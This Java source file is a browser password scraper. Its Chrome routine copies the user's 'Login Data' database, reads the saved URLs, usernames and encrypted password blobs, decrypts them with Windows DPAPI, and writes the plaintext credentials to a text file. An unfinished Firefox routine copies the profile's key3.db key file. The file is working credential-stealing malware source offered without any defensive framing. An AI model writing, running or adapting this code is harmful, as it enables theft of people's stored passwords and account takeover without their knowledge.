import java.util.*;

import org.apache.commons.io.FileUtils;

import com.sun.jna.platform.win32.*;

import java.io.File;

import java.io.IOException;
import java.io.FileOutputStream;
import java.io.PrintStream;
import java.sql.DriverManager;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

// Password Scraper for Chrome/Firefox/IE for Windows/Linux/Mac

public class jdec extends Crypt32Util {
	
	public static void ChromeDec() throws IOException, SQLException {
		
		// Get username
		String user = System.getProperty("user.name");
		
		// Chrome
		File chrome = FileUtils.getFile("C:/Users/" + user + "/AppData/Local/Google/Chrome/User Data/Default/Login Data");
		File chromedest = FileUtils.getFile("logindata.db");
		FileUtils.copyFile(chrome, chromedest);
	
		Connection conn = null;

		// Use arguments string for db url
		String url = "jdbc:sqlite:logindata.db";
		conn = DriverManager.getConnection(url);

	
		// SQL Queries
		Statement stmt1 = conn.createStatement();
		Statement stmt2 = conn.createStatement();
		Statement stmt3 = conn.createStatement();
		Statement stmt4 = conn.createStatement();
		String sqlurls = "SELECT origin_url FROM logins ORDER BY username_value";
		String sqlusernames = "SELECT username_value FROM logins ORDER BY username_value";
		String sqlpassblobs = "SELECT password_value FROM logins ORDER BY username_value";
		String count = "SELECT COUNT(username_value) FROM logins ORDER BY username_value";
		ResultSet dbcount = stmt4.executeQuery(count);
		int cint = dbcount.getInt(1);
	
		ArrayList<byte[]> bytearray = new ArrayList<byte[]>();
	
		ResultSet rsurls = stmt1.executeQuery(sqlurls);
		ResultSet rsusernames = stmt2.executeQuery(sqlusernames);
		ResultSet rspassblobs = stmt3.executeQuery(sqlpassblobs);
	
		// URLs into String array
		int urint = 0;
		String[] urls = new String[cint];
		while(urint!=cint){
		urls[urint] = rsurls.getString(1);
		rsurls.next();
		urint++;
		}
	
		// Usernames into String array
		int unint = 0;
		String[] usernames = new String[cint];
		while(unint!=cint) {
		usernames[unint] = rsusernames.getString(1);
		rsusernames.next();
		unint++;
		}
	
		int pint = 0;
		// Putting BLOBs into byte array
		while(pint!=cint) {
		bytearray.add(rspassblobs.getBytes(1));
		rspassblobs.next();
		pint++;
		}
	
	
		ArrayList<byte[]> unencrypted = new ArrayList<byte[]>();
		int x = 0;
	
		// Decrypt data
		while(x != cint) {
			unencrypted.add(cryptUnprotectData(bytearray.get(x), 0));
			x++;
		}
	
		// Put decrypted passwords into string array
		String[] passwords = new String[cint];
		for(int y = 0; y < cint; y++) {
			passwords[y] = new String(unencrypted.get(y), "UTF-8");
		}
	
		// Print results
		for(int i = 0; i < cint; i++) {
		System.out.println(urls[i] + " -- " + usernames[i] + " -- " + passwords[i]);
		}
	}
	
	public void FirefoxDec() throws IOException {
		
		// Get username
		String user = System.getProperty("user.name");

		// Firefox -- Uses a decryption key in the Mozilla folder which we need to use, password file is in JSON format
		File firefoxloc = FileUtils.getFile("C:/Users/" + user + "/AppData/Roaming/Mozilla/Firefox/Profiles");
		String[] fuckfirefox = firefoxloc.list();
		String userloc = new String();
	
		// Search for profile default login, potentially other usernames but most people will use default Firefox profile
		for(String directory : fuckfirefox){
			if(directory.contains(".default")){
				userloc = directory;
			}
		}
	
		// Get Key File
		File firefox = FileUtils.getFile("C:/Users/" + user + "/AppData/Roaming/Mozilla/Firefox/Profiles/" + userloc + "key3.db");
		File firefoxdest = FileUtils.getFile("key3.db");
		FileUtils.copyFile(firefox, firefoxdest);
		
		// WIP -- More to come soon
		
	}
	
	public static void main(String[] args) throws SQLException, IOException {
		
		// Redirect output to text file
		PrintStream out = new PrintStream(new FileOutputStream("output.txt"));
		System.setOut(out);
		
		ChromeDec();
		
	}
}
